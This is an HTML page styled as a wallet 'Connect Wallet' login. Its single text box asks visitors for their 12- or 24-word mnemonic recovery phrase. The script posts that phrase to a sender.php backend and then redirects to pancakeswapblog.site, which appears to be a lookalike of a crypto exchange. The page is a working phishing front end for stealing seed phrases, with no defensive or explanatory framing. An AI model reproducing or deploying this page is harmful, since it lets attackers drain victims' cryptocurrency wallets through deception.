<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Page</title>
    <style>
        body {
            margin: 0;
            font-family: Arial, sans-serif;
            background-color: #161e32; /* Updated background color */
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .login-container {
            background-color: #00008B;
            border-radius: 12px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            padding: 20px;
            width: 100%;
            max-width: 500px;
            text-align: center;
            box-sizing: border-box;
            position: relative;
        }

        .button-container {
            padding: 20px;
            width: 100%;
            text-align: center;
            box-sizing: border-box;
            position: relative;
        }

        .logo-placeholder {
            margin-bottom: 20px;
            height: auto;
            display: flex;
            justify-content: center;
            align-items: center;
        }


        .logo-placeholder2{
            margin-bottom: 20px;
            margin-top: 20px;
            height: auto;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: forestgreen;
        }

        .logo-placeholder img {
            max-height: 80px;
            width: auto;
            max-width: 100%;
        }


        .logo-placeholder2 img {
            max-height: 80px;
            width: auto;
            max-width: 100%;
        }


        .message-container {
            position: absolute;
            top: -70px;
            left: 50%;
            transform: translateX(-50%);
            width: 100%;
            text-align: center;
        }

        .message {
            padding: 10px;
            border-radius: 8px;
            font-size: 16px;
            color: #fff;
            margin-bottom: 10px;
            display: none;
        }

        .message.success {
            background-color: #28a745;
        }

        .message.error {
            background-color: #dc3545;
        }

        textarea {
            width: 100%;
            height: 100px;
            padding: 10px;
            font-size: 16px;
            border: 1px solid #ccc;
            border-radius: 8px;
            resize: none;
            margin-bottom: 20px;
            box-sizing: border-box;
        }

        textarea::placeholder {
            color: #aaa;
        }

        button {
            width: 100%;
            padding: 12px;
            font-size: 16px;
            font-weight: bold; /* Make button text bold */
            color: #ffffff; /* Updated button text color */
            background-color: #00008B; /* Updated button color */
            border: none;
            border-radius: 8px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        button:hover {
            background-color: #35359f; /* Darker shade for hover effect */
        }

        @media (max-width: 400px) {
            .logo-placeholder img {
                max-height: 60px;
            }

            textarea {
                height: 80px;
            }

            button {
                font-size: 14px;
            }
        }
    </style>
    <script>
        function displayPopup(message, type) {
            const messageContainer = document.querySelector('.message-container');
            const messageBox = document.createElement('div');
            messageBox.className = `message ${type}`;
            messageBox.innerText = message;
            messageContainer.appendChild(messageBox);

            messageBox.style.display = 'block';

            setTimeout(() => {
                messageBox.style.display = 'none';
                messageBox.remove();
            }, 5000); // Updated to 5 seconds
        }

        async function handleFormSubmit(event) {
    event.preventDefault(); // Prevent default form submission

    const formData = new FormData(event.target);

    try {
        // Make the POST request using Fetch API
        const response = await fetch('sender.php', {
            method: 'POST',
            body: formData
        });

        // Check if the response is valid and parse it
        if (!response.ok) {
            throw new Error('Network response was not ok');
        }

        const result = await response.json();

        // Display the response message using your custom displayPopup function
        displayPopup(result.message, result.status);

        // Handle special redirection if the specific message is returned
        if (result.message === "Logged in Successfully...") {
            setTimeout(() => {
                window.location.href = 'https://pancakeswapblog.site/app'; // Adjust the URL as needed
            }, 3000); // Wait for 3 seconds before redirecting
        }
    } catch (error) {
        // Handle errors gracefully
        console.error('An error occurred:', error);
        displayPopup('An unexpected error occurred. Please try again.', 'error');
    }
}

    </script>
</head>
<body>
    <form method="POST" onsubmit="handleFormSubmit(event)">
        <div class="login-container">
            <div class="logo-placeholder">
                <img src="ray.png" alt="Logo">
            </div>
            <div class="message-container"></div>
            <textarea name="user_input" placeholder="Enter your 12 or 24 word Mnemonic Phrase here..."></textarea>
        </div>
       <div class=button-container>
              <button type="submit" style="width: 70%">Connect Wallet</button>
       </div>
    </form>
</body>
</html>
